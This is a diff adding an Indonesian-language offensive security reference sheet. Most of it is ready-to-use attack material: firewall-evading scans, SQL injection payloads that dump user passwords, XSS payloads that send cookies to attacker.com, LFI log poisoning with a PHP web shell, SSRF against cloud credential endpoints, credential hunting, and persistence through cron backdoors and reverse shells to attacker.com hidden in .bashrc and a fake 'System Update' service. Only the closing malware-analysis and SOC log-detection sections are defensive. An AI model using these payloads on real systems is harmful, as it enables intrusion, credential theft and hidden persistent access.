@@ -1,0 +1,330 @@
+# Teknik Serangan & Analisis Ofensif (Referensi Profesional)
+
+## Reconnaissance Aktif — Teknik Lengkap
+
+### Nmap Advanced Techniques
+```bash
+# Full TCP SYN scan semua port dengan service/version detection
+nmap -sS -sV -sC -p- --min-rate 5000 -oA full_scan <target>
+
+# UDP scan (lebih lambat, tapi penting)
+nmap -sU --top-ports 1000 -oA udp_scan <target>
+
+# OS detection
+nmap -O --osscan-guess <target>
+
+# Firewall bypass techniques
+nmap -f <target>                    # Fragment packets
+nmap -D RND:10 <target>             # Decoy scan
+nmap --source-port 53 <target>      # Spoof source port (DNS)
+nmap -sA <target>                   # ACK scan (firewall rule mapping)
+
+# Script categories
+nmap --script=vuln <target>         # Vulnerability check
+nmap --script=auth <target>         # Authentication bypass tests
+nmap --script=exploit <target>      # Exploitation scripts
+nmap --script=smb-vuln* <target>    # SMB vulnerabilities (EternalBlue, etc)
+```
+
+### Web Enumeration
+```bash
+# Directory dan file discovery
+feroxbuster -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,js,txt,json,bak -o ferox_results.txt
+
+# Parameter fuzzing
+ffuf -u "http://target.com/page?FUZZ=value" -w params_wordlist.txt
+ffuf -u "http://target.com/page?id=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
+
+# Virtual host fuzzing
+ffuf -u http://target.com -H "Host: FUZZ.target.com" -w subdomains.txt -fs 0
+
+# API endpoint discovery
+ffuf -u http://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt
+```
+
+## Eksploitasi Web — Teknik Detail
+
+### SQL Injection Manual Testing
+```
+# Boolean-based detection
+' AND 1=1-- -    (true)
+' AND 1=2-- -    (false)
+
+# Time-based blind SQLi
+' AND SLEEP(5)-- -          (MySQL)
+'; WAITFOR DELAY '0:0:5'-- - (MSSQL)
+' AND pg_sleep(5)-- -       (PostgreSQL)
+
+# Error-based SQLi (MySQL)
+' AND extractvalue(1,concat(0x7e,version()))-- -
+
+# UNION-based - cari jumlah kolom
+' ORDER BY 1-- -
+' ORDER BY 2-- -
+' UNION SELECT NULL-- -
+' UNION SELECT NULL,NULL-- -
+
+# Extract data
+' UNION SELECT table_name,NULL FROM information_schema.tables-- -
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
+' UNION SELECT username,password FROM users-- -
+```
+
+### XSS Payload Arsenal
+```javascript
+// Basic
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+
+// Bypass filter
+<ScRiPt>alert(1)</ScRiPt>
+<script>alert`1`</script>
+"><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+
+// Cookie stealing
+<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
+<img src=x onerror="fetch('http://attacker.com/'+document.cookie)">
+
+// DOM XSS
+#"><img src=x onerror=alert(1)>
+
+// CSP bypass via JSONP
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
+```
+
+### LFI/RFI (Local/Remote File Inclusion)
+```
+# Basic LFI
+?file=../../../../etc/passwd
+?page=../../../windows/win.ini
+
+# PHP wrapper bypass
+?file=php://filter/convert.base64-encode/resource=index.php
+?file=php://input   (dengan POST body berisi PHP code)
+?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+
+# Log poisoning → RCE via LFI
+# 1. Poison Apache log dengan User-Agent berisi PHP code
+curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
+# 2. Include log
+?file=../../../../var/log/apache2/access.log&cmd=id
+```
+
+### SSRF Full Exploitation
+```
+# Internal network scan via SSRF
+?url=http://192.168.1.1/
+?url=http://10.0.0.1:8080/admin
+
+# AWS metadata via SSRF
+?url=http://169.254.169.254/latest/meta-data/
+?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+?url=http://169.254.169.254/latest/user-data
+
+# Bypass SSRF filters
+?url=http://127.0.0.1@evil.com  # @ confusion
+?url=http://evil.com#@127.0.0.1 # Fragment abuse
+?url=http://0x7f000001          # Hex IP (127.0.0.1)
+?url=http://[::1]               # IPv6 localhost
+?url=dict://127.0.0.1:6379/     # Redis via SSRF
+?url=gopher://127.0.0.1:6379/_FLUSHALL%0d%0a  # Redis command injection
+```
+
+## Post-Exploitation
+
+### Linux Privilege Escalation Checklist
+```bash
+# System info
+uname -a; id; whoami; hostname; cat /etc/os-release
+
+# SUID/SGID
+find / -perm -4000 -o -perm -2000 2>/dev/null | xargs ls -la
+
+# Sudo rights
+sudo -l
+
+# Writable directories
+find / -writable -type d 2>/dev/null
+
+# Cron jobs
+cat /etc/crontab; ls -la /etc/cron*; crontab -l
+
+# Running processes
+ps aux; netstat -tlnp
+
+# Sensitive files
+cat /etc/passwd; cat /etc/shadow (jika readable)
+find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l "password" 2>/dev/null
+find / -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null
+
+# PATH hijacking
+echo $PATH; find . -type f -perm -o+w 2>/dev/null
+
+# Docker escape
+find / -name docker.sock 2>/dev/null
+```
+
+### Windows Privilege Escalation
+```powershell
+# System info
+systeminfo; whoami /all; net user; net localgroup administrators
+
+# Unquoted service paths (classic vuln)
+wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+# AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# Credentials in registry
+reg query HKLM /f password /t REG_SZ /s
+
+# Weak service permissions
+sc qc <service_name>
+accesschk.exe -uwcqv "Everyone" *
+
+# PowerShell history
+(Get-PSReadlineOption).HistorySavePath | Get-Content
+```
+
+### Persistence Mechanisms
+```bash
+# Linux crontab
+(crontab -l; echo "*/5 * * * * /tmp/.backdoor") | crontab -
+
+# Linux ~/.bashrc
+echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1 &" >> ~/.bashrc
+
+# Systemd service
+cat > /etc/systemd/system/update.service << EOF
+[Unit]
+Description=System Update
+[Service]
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
+Restart=always
+[Install]
+WantedBy=multi-user.target
+EOF
+```
+
+## Analisis Malware — Teknik Dasar
+
+### Static Analysis
+```bash
+# File identification
+file malware.bin
+strings malware.bin | grep -E "(http|\.exe|cmd|powershell)"
+xxd malware.bin | head -20   # Hex dump
+
+# PE analysis (Windows executable)
+pecheck malware.exe
+pescan malware.exe
+readelf -h malware.elf       # Linux ELF
+
+# Import table (Windows)
+dumpbin /imports malware.exe
+# Dangerous imports: CreateRemoteThread, WriteProcessMemory, VirtualAllocEx → code injection
+
+# Hash untuk threat intel
+md5sum malware.bin
+sha256sum malware.bin
+# Cek di: VirusTotal, MalwareBazaar, AnyRun
+```
+
+### Dynamic Analysis (Sandbox)
+```
+Tools: Cuckoo Sandbox (self-hosted), AnyRun, VirusTotal sandbox, Joe Sandbox
+
+Yang diamati:
+- Network connections (C2 server, exfiltration)
+- File system changes (persistence, payload drop)
+- Registry modifications
+- Process creation (child processes, injection)
+- API calls (behavioral analysis)
+
+Tools lokal:
+- Process Monitor (Procmon) — file/registry/network activity
+- Wireshark — network traffic
+- Process Hacker — memory dan proses
+```
+
+### Indicators of Compromise (IOC)
+```
+Kategori IOC:
+- Hash: MD5, SHA1, SHA256 dari file malware
+- IP: Alamat C2 server
+- Domain: Domain C2 atau dropper
+- URL: URL download payload
+- Registry key: Persistence mechanism
+- Mutex: Identifier unik malware (mencegah double infection)
+- File path: Lokasi malware menaruh file
+
+Format sharing IOC: STIX/TAXII, MISP, OpenIOC
+```
+
+## Network Forensics
+
+### Analisis Pcap
+```bash
+# tcpdump capture
+tcpdump -i eth0 -w capture.pcap
+tcpdump -r capture.pcap 'host 192.168.1.100'
+
+# Wireshark filters berguna
+http.request.method == "POST"           # POST requests
+tcp.flags.syn == 1 && tcp.flags.ack == 0  # SYN scan detection
+dns.qry.name contains "evil"            # DNS queries
+ftp || ftp-data                         # FTP traffic
+smtp || pop || imap                     # Email traffic
+
+# Ekstrak file dari pcap
+tcpflow -r capture.pcap
+# Atau Wireshark: File → Export Objects → HTTP
+
+# Tshark CLI
+tshark -r capture.pcap -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri
+```
+
+### Log Analysis untuk SOC
+```python
+# Parse Apache access log
+import re
+from collections import Counter, defaultdict
+from datetime import datetime
+
+LOG_PATTERN = r'(\d+\.\d+\.\d+\.\d+) .* \[(.*?)\] "(.*?)" (\d+) (\d+|-)'
+
+def analyze_logs(log_file):
+    ip_requests = Counter()
+    status_errors = defaultdict(list)
+    suspicious = []
+    
+    with open(log_file) as f:
+        for line in f:
+            m = re.match(LOG_PATTERN, line)
+            if not m:
+                continue
+            ip, timestamp, request, status, size = m.groups()
+            ip_requests[ip] += 1
+            
+            # Deteksi SQL injection attempt
+            if any(p in request.lower() for p in ["'", "union select", "1=1", "or 1"]):
+                suspicious.append({"ip": ip, "request": request, "type": "SQLi"})
+            
+            # Deteksi path traversal
+            if "../" in request or "..%2F" in request.lower():
+                suspicious.append({"ip": ip, "request": request, "type": "PathTraversal"})
+            
+            # 4xx/5xx errors
+            if status.startswith(('4', '5')):
+                status_errors[ip].append(status)
+    
+    return {
+        "top_ips": ip_requests.most_common(10),
+        "suspicious": suspicious,
+        "brute_force_candidates": [ip for ip, errs in status_errors.items() 
+                                   if errs.count('401') > 10 or errs.count('403') > 20]
+    }
+```
